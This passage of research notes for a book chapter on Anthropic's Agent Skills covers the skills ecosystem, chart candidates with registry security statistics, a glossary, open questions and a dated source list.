    case → `grading.json` → `benchmark.json` (with vs without skill: pass-rate/tokens/time) → HTML
    review viewer → refine description/body → repeat; separate blind-A/B branch for version
    comparison [S5][S12].
11. **Ecosystem map** — agentskills.io hub (governed via GitHub + Discord) with spokes to Claude/
    Claude Code, ChatGPT/Codex, Cursor, Gemini CLI, VS Code/Copilot, OpenCode, OpenHands, Goose, Roo
    Code, Letta, Amp, JetBrains Junie, OpenClaw, and ~30 more listed adopters [S6].
12. **Cross-surface non-sync problem** — three disconnected stores (claude.ai custom skills / Claude
    API workspace skills / Claude Code filesystem skills) with a dashed "no sync" line between each
    pair, and a single org's Git repo as the only realistic source-of-truth workaround [S18][S19].

## Chart candidates

1. **ClawHub verdict comparison** (grouped bar): Behavioral-LLM verdicts (Benign 9.6% / Vulnerable
   86.0% / Malicious 4.4%) vs. VirusTotal verdicts (Clean 42.6% / Suspicious 57.2% / Malicious 0.04%),
   n=2,354, Trent AI, April 2026 [S13].
2. **Malicious-package category breakdown** (bar, n=103): Namespace Squatting ~30–35, Phantom
   Implementations ~25–30, Credential Harvesting ~15–20, Code-Free Social Engineering ~10–15,
   Automated Fraud ~10–15, Financial Fraud ~5 — Trent AI, April 2026 [S13].
3. **Socket scanner performance** (bar): Precision 94.5% / Recall 98.7% / F1 96.7%, tested on 382
   malicious + 355 benign skills.sh skills, Feb 2026 [S17].
4. **skills.sh ecosystem snapshot** (bar/mixed): Skills 3,884, Publishers 1,079, Repos 1,188 (left
   axis) vs Installs 170.4M (right axis, log scale) — dashboard snapshot 2026-09-30, annotate the
   discrepancy with Socket's independent "60,000+" figure from Feb 2026 [S22][S17].
5. *(Thin — flag as weak)* Description-tuning before/after: only "5 of 6 skills improved" is public;
   no per-skill hit-rate numbers were published, so a real chart would need the underlying numbers,
   not available in sources found [S12].

## Glossary

- **SKILL.md**: the required file at a skill folder's root; YAML frontmatter (metadata) + Markdown
  body (instructions) [S7].
- **Progressive disclosure**: loading skill content in stages (metadata → body → bundled files) so
  installed-but-unused skills cost near-zero context [S1][S7].
- **Degrees of freedom**: how much latitude a skill's instructions give the model — low (exact
  script) to high (prose heuristics) — matched to task fragility [S11].
- **`allowed-tools`**: frontmatter field pre-approving specific tools for the invoking turn;
  experimental in the open spec, much richer in Claude Code [S7][S5].
- **`context: fork`** (Claude Code only): runs a skill's body as the task prompt for a new,
  isolated subagent rather than inline in the current conversation [S5].
- **Code execution container**: the sandboxed VM the Claude API spins up per the
  `code_execution_20250825` tool, inside which skills' files live and scripts run; no network, no
  runtime package installs [S10][S18].
- **Skills API**: the `/v1/skills` + `/v1/skills/{id}/versions` REST surface for uploading and
  versioning custom skills for API use, workspace-scoped [S10].
- **agentskills.io / Agent Skills standard**: the open, cross-vendor specification Anthropic
  published 2025-12-18, now governed loosely via a public GitHub repo and Discord [S3][S6].
- **skills-ref**: the reference validation library/CLI (`skills-ref validate ./my-skill`) for
  checking spec compliance [S7].
- **ClawHub**: OpenClaw's community skill/plugin marketplace; the site of the documented malware and
  scope-squatting incidents in this chapter [S8][S14].
- **Scope squatting**: publishing a package under an official-looking namespace (`@openclaw/...`)
  without actually being vetted as that namespace's owner, exploiting the registry's advertised (but
  unenforced) trust signal [S14].
- **skill-creator**: Anthropic's own meta-skill/plugin for drafting, evaluating, benchmarking, and
  A/B-testing other skills [S12][S24].
- **Recall (of a skill)**: whether Claude successfully notices and selects the right skill among many
  installed ones — degrades as skill count grows, with no fixed threshold published [S19].

## Unverified / open questions

- **agentskills.io governance model beyond "GitHub + Discord."** No formal steering committee,
  versioning cadence, or vendor-neutral foundation was found described anywhere in the sources
  fetched; the site's own "Open development" section states only that Anthropic originated it and
  it's "open to contributions" [S6]. Tried: read the full agentskills.io landing page and
  specification page; neither names a governance body.
- **The 60,000-skill (Socket, Feb 2026) vs. 3,884-skill (skills.sh dashboard, Sept 2026) discrepancy**
  is unresolved in the sources read — could be different counting scope (Socket may count
  cross-platform duplicates or a broader multi-registry crawl) or the dashboard could undercount;
  no source reconciles the two numbers. Tried: read both source pages directly; neither cites the
  other's methodology.
- **futuresearch.ai / everyrow.io "What to Put in a Claude Code Skill for Reviewing Your Team's Code"**
  (HN, 2026-03-05, 9 points) — the URL redirected (`everyrow.io` → `futuresearch.ai`) and no matching
  article was found on the target blog as of 2026-09-30; the post may have been removed, renamed, or
  the blog restructured. Tried: WebFetch on both the original and the redirect target.
- **Exact skill-count threshold where recall degrades** — Anthropic explicitly declines to give a
  number ("use your evaluation suite... stop adding when performance degrades") [S19]; no independent
  benchmark study measuring this threshold was found in the time available.
- **OpenAI Codex/ChatGPT's fidelity to every open-spec field** (e.g., whether `compatibility` and
  `metadata` behave identically to Anthropic's implementation) was summarized from one doc page
  (`learn.chatgpt.com/docs/build-skills`) rather than cross-checked against Codex's own source or a
  second independent test; treat the "OpenAI adopted the standard" claim as confirmed, but field-level
  parity as only lightly checked.
- **"Don't Build Agents, Build Skills Instead" (Anthropic's Barry and Mahesh, YouTube, 2025-12-13)**
  — found only as an HN listing (1 point), not watched; likely contains additional concrete framing
  but was out of scope for a text-based research pass in the time available.

## Sources

- [S1] "Equipping agents for the real world with Agent Skills." Anthropic Engineering Blog. 2025-10-16. https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills — accessed 2026-09-30.
- [S2] Simon Willison. "Claude Skills are awesome, maybe a bigger deal than MCP." simonwillison.net. 2025-10-16. https://simonwillison.net/2025/Oct/16/claude-skills/ — accessed 2026-09-30.
- [S3] "Skills." Claude/Anthropic blog (redirected from anthropic.com/news/skills). 2025-10-16, updated 2025-12-18. https://claude.com/blog/skills — accessed 2026-09-30.
- [S4] "anthropics/skills" GitHub repository README. Anthropic. Undated, live repo. https://github.com/anthropics/skills — accessed 2026-09-30.
- [S5] "Extend Claude with skills." Claude Code docs. https://code.claude.com/docs/en/skills — accessed 2026-09-30 (documents behavior through Claude Code ~v2.1.28x).
- [S6] "Agent Skills Overview" and client showcase. agentskills.io. https://agentskills.io — accessed 2026-09-30.
- [S7] "Specification." agentskills.io. https://agentskills.io/specification — accessed 2026-09-30.
- [S8] "From magic to malware: how OpenClaw's Agent Skills become an attack surface." 1Password Blog. 2026-02-02. https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface — accessed 2026-09-30.
- [S9] Tom MacWright. "Agent Skills." macwright.com. 2025-10-20. https://macwright.com/2025/10/20/agent-skills — accessed 2026-09-30.
- [S10] "Using Agent Skills with the API" (Skills API guide). platform.claude.com. https://platform.claude.com/docs/en/api/skills-guide — accessed 2026-09-30.
- [S11] "Skill authoring best practices." platform.claude.com. https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices — accessed 2026-09-30.
- [S12] "Improving skill-creator: test, measure, and refine Agent Skills." Claude blog. 2026-03-03. https://claude.com/blog/improving-skill-creator-test-measure-and-refine-agent-skills — accessed 2026-09-30.
- [S13] Julien Brouchier. "Distinguishing Malicious from Vulnerable: 2,354 Popular ClawHub Skills Analysed." Trent AI blog. ~April 2026. https://trent.ai/blog/clawhub-ai-agent-security-analysis/ — accessed 2026-09-30.
- [S14] "ClawHub's 23 plugins squat the official @openclaw and @clawhub scopes." Manifold Security blog. 2026-06 (disclosure 2026-06-17, fix 2026-06-19). https://www.manifold.security/blog/scope-squatting-clawhub-plugins — accessed 2026-09-30.
- [S15] Jordan Rubin. "An Abstract Arsenal: Future Tokens in Claude Skills." jordanmrubin.substack.com. 2025-12-04. https://jordanmrubin.substack.com/p/an-abstract-arsenal — accessed 2026-09-30.
- [S16] Hemanth HM. "Skills vs MCP? Wrong Question." h3manth.com. ~2025-12 (HN post dated 2025-12-22). https://h3manth.com/scribe/skills-and-mcp-better-together/ — accessed 2026-09-30.
- [S17] "Socket brings supply chain security to skills.sh." Socket.dev blog. 2026-02-17. https://socket.dev/blog/socket-brings-supply-chain-security-to-skills — accessed 2026-09-30.
- [S18] "Agent Skills" overview. platform.claude.com. https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview — accessed 2026-09-30.
- [S19] "Skills for enterprise." platform.claude.com. https://platform.claude.com/docs/en/agents-and-tools/agent-skills/enterprise — accessed 2026-09-30.
- [S20] Cursor docs, "Skills." https://cursor.com/docs/context/skills — accessed 2026-09-30.
- [S21] "Build Skills." learn.chatgpt.com (OpenAI/ChatGPT/Codex docs). https://learn.chatgpt.com/docs/build-skills — accessed 2026-09-30.
- [S22] "Skills.sh Ecosystem Dashboard." skills-dashboard.olshansky.info. Snapshot dated 2026-09-30. https://skills-dashboard.olshansky.info/ — accessed 2026-09-30.
- [S23] `skills/mcp-builder/SKILL.md`, anthropics/skills repo (verbatim excerpt via raw.githubusercontent.com). Accessed 2026-09-30.
- [S24] `skills/skill-creator/SKILL.md`, anthropics/skills repo (verbatim excerpt via raw.githubusercontent.com). Accessed 2026-09-30.
- [S25] Hacker News / Algolia search results used for source discovery and to corroborate real-world skill examples (godogen, geosql, chess-postmortem-skills, claudeskills.cc, noriskillsets.dev, etc.) — titles/URLs/dates only, not deep-read; used as pointers, not as cited factual claims. https://hn.algolia.com/api/v1/search — accessed 2026-09-30.

Cross-links: MCP protocol mechanics → ch05 (05-mcp); the `mcp-builder` skill [S23] is itself a
skill that teaches Claude to build MCP servers — a concrete example of the two layers composing.
Subagent orchestration mechanics (`context: fork`, agent types) → ch12/13. CLAUDE.md/AGENTS.md
memory mechanics → ch11 and ch02 (context engineering).
